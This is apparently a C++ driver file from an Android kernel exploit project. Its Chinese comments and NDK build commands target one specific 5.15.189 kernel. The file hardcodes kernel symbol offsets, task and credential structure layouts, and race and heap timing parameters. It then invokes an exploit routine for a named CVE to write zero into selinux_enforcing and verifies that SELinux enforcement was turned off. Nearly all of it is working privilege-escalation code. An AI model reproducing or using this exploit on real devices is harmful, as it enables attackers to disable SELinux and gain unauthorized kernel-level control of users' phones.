/**
 * @file main_legacy.cpp
 * @brief A/B 用临时入口：调用**未修改的** legacy C++ 树，写死 5.15.189 文档参数。
 *
 * 与 dev/main_dev.cpp（重构后的 core）对照：
 *   - 同样写死 release/offset/multicast geometry/execution；
 *   - 同样只做一次 W1 写（selinux_enforcing := 0, multicast）；
 *   - 同样输出 [dev] 外层日志与致命信号标记；
 *   - 区别：这里调用 legacy 的 `Cve2026_43499Policy::attack_write<MulticastPolicy>`，
 *     不经过 core/ 的参数化结构。
 *
 * 构建（legacy 树全部源文件，排除 main.cpp/tests）：
 *
 *   NDK=$HOME/Library/Android/sdk/ndk/30.0.16248370
 *   $NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android24-clang++ \
 *     -std=c++23 -O2 -fPIE -pie -D__ARM -DTARGET_CONFIG_H='"target.h"' \
 *     -static-libstdc++ -I app/src/main/cpp/gl43499/legacy \
 *     $(find app/src/main/cpp/gl43499/legacy -name '*.cpp' \
 *         ! -path '*tests*' ! -name 'main.cpp') \
 *     app/src/main/cpp/gl43499/dev/main_legacy.cpp \
 *     -o build/ghostlock-legacy-dev
 */
#include <cstdio>
#include <cstdint>
#include <csignal>
#include <fcntl.h>
#include <unistd.h>

#include "common.h"
#include "kernel/target.h"
#include "route/route_policy.hpp"
#include "session/backend/cve_2026_43499_backend.hpp"
#include "session/exploit_session.hpp"

namespace {
    void on_fatal_signal(int sig) {
        const char *msg = "[dev] fatal signal caught\n";
        (void)!write(STDOUT_FILENO, msg, 26);
        _exit(128 + sig);
    }

    constexpr const char *kRelease =
        "5.15.189-android13-8-00016-g51bba4309aac-ab14546557";

    std::int32_t read_enforce() {
        int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
        if (fd < 0) return -1;
        char value = 0;
        const ssize_t n = read(fd, &value, 1);
        close(fd);
        return n == 1 ? (value - '0') : -1;
    }
} // namespace

int main() {
    std::signal(SIGSEGV, on_fatal_signal);
    std::signal(SIGBUS, on_fatal_signal);
    std::signal(SIGABRT, on_fatal_signal);
    std::signal(SIGILL, on_fatal_signal);
    ghostlock::kernel::set_unbuffer();
    ghostlock::kernel::set_limit();
    ghostlock::kernel::pin_to_core(0);

    ghostlock::profile::kernel_offsets decoded{};
    decoded.uname_r = kRelease;
    decoded.route = static_cast<std::uint8_t>(
        ghostlock::profile::RouteKind::MulticastWaiter);
    decoded.meta.kernel_major = 5;
    decoded.meta.recommend_shizuku = 1;
    decoded.meta.fallback_route = static_cast<std::uint8_t>(
        ghostlock::profile::RouteKind::Auto);
    decoded.meta.safe_mode = 0;

    decoded.offsets.init_task = 46412800ULL;
    decoded.offsets.init_cred = 46126472ULL;
    decoded.offsets.empty_zero_page = 47529984ULL;
    decoded.offsets.root_task_group = 47549120ULL;
    decoded.offsets.selinux_enforcing = 47885704ULL;
    decoded.offsets.selinux_blob_sizes = 35027656ULL;
    decoded.offsets.security_hook_heads = 35018304ULL;
    decoded.offsets.slide_nfulnl_logger = 45096488ULL;
    decoded.offsets.slide_boot_id = 47999001ULL;
    decoded.offsets.slide_loggers_0_1 = 45096280ULL;

    decoded.geometry.mcast_waiter_off = 96;
    decoded.geometry.mcast_buffer_size = 264;
    decoded.geometry.mcast_task_offset = 48;
    decoded.geometry.mcast_lock_offset = 56;
    decoded.misc.compact_waiter = 1;
    decoded.misc.kernelsnitch_collisions = 8;
    decoded.misc.mm_struct_sz = 0x400;

    decoded.task.prio = 0x7C;
    decoded.task.normal_prio = 0x84;
    decoded.task.sched_task_group = 0x400;
    decoded.task.pi_lock = 0x884;
    decoded.task.pi_waiters = 0x898;
    decoded.task.pi_top_task = 0x8A8;
    decoded.task.pi_blocked_on = 0x8B0;
    decoded.task.pid = 0x5D8;
    decoded.task.tgid = 0x5DC;
    decoded.task.atomic_flags = 0x598;
    decoded.task.real_cred = 0x790;
    decoded.task.cred = 0x798;
    decoded.task.comm = 0x7A8;
    decoded.task.tasks = 0x4D0;
    decoded.task.seccomp = 0x860;

    decoded.credential.copy_size = 0xb0;
    decoded.credential.usage_value = 0x100;
    decoded.credential.caps_offset = 0x30;
    decoded.credential.caps_count = 3;
    decoded.credential.caps_value = 0x000001ffffffffffULL;
    decoded.credential.ref_count = 4;
    decoded.credential.ref0_offset = 0x80;
    decoded.credential.ref1_offset = 0x88;
    decoded.credential.ref2_offset = 0x90;
    decoded.credential.ref3_offset = 0x98;
    decoded.credential.ref0_image = 0xffffffc00ab23a80ULL;
    decoded.credential.ref1_image = 0xffffffc00acce110ULL;
    decoded.credential.ref2_image = 0xffffffc00ab23ff0ULL;
    decoded.credential.ref3_image = 0xffffffc00ab23b28ULL;

    decoded.execution.recommended_main_cpu = 0;
    decoded.execution.recommended_consumer_cpu = 1;
    decoded.execution.heap_prepare_max_attempts = 6;
    decoded.execution.heap_prepare_timeout_ms = 240000;
    decoded.execution.heap_kernelsnitch_timeout_ms = 120000;
    decoded.execution.race_route_wait_ms = 1000;
    decoded.execution.race_route_done_timeout_ms = 300000;
    decoded.execution.race_setup_settle_us = 100000;
    decoded.execution.race_state_poll_interval_us = 1000;
    decoded.execution.select_enter_delay_us = 50000;
    decoded.execution.select_timeout_us = 200000;
    decoded.execution.select_consumer_burst_calls = 1;
    decoded.execution.select_consumer_max_calls = 1;
    decoded.execution.tcp_attempts = 2000;
    decoded.execution.tcp_arm_sequence = 16;
    decoded.execution.tcp_post_receive_hold_iterations = 20000;

    auto &s = ghostlock::session::g_exploit_session;
    s.profile = ghostlock::profile::TargetProfile::from(&decoded);
    s.runtime.main_cpu = 0;
    s.runtime.consumer_cpu = 1;
    s.heap.init();
    s.race.main_cpu = 0;
    s.race.consumer_cpu = 1;
    if (s.addresses.init(&s.profile) != 0) {
        std::fprintf(stderr, "addresses init failed\n");
        return 2;
    }

    const std::uintptr_t image =
        ghostlock::kernel::KIMAGE_TEXT_BASE + 47885704ULL;
    const std::uintptr_t target = s.addresses.data_alias(image);
    const std::int32_t enforce_before = read_enforce();
    std::printf("release=%s (legacy)\n", kRelease);
    std::printf("selinux_enforcing image=0x%016zx alias=0x%016zx enforce=%d\n",
                static_cast<std::size_t>(image),
                static_cast<std::size_t>(target), enforce_before);
    if (!target) return 3;

    const ghostlock::memory::WriteRequest request =
        ghostlock::memory::WriteRequest::make(
            target, ghostlock::memory::WriteMode::Zero, 0);
    const std::int32_t routed =
        ghostlock::session::backend::Cve2026_43499Policy::attack_write<
            ghostlock::route::MulticastPolicy>(s, request, "legacy dev W1: SELinux");
    const std::int32_t enforce_after = read_enforce();
    std::printf("routed=%d enforce_before=%d enforce_after=%d\n", routed,
                enforce_before, enforce_after);
    return routed == 1 ? 0 : 1;
}
